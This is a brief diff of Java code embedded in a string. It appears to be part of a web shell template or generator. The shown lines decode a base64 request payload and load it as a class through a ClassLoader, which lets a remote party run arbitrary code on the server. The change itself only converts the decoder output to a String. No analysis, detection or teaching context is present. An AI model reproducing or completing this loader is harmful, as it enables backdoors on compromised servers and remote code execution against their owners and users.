@@ -4,7 +4,7 @@ code = """
         if (payload == null) {
             return null;
         }
-        payload = decoder(payload);
+        payload = new String(decoder(payload));
         byte[] b = b64decode(payload);
         this.getClass().getConstructor(ClassLoader.class)
                 .newInstance(this.getClass().getClassLoader())
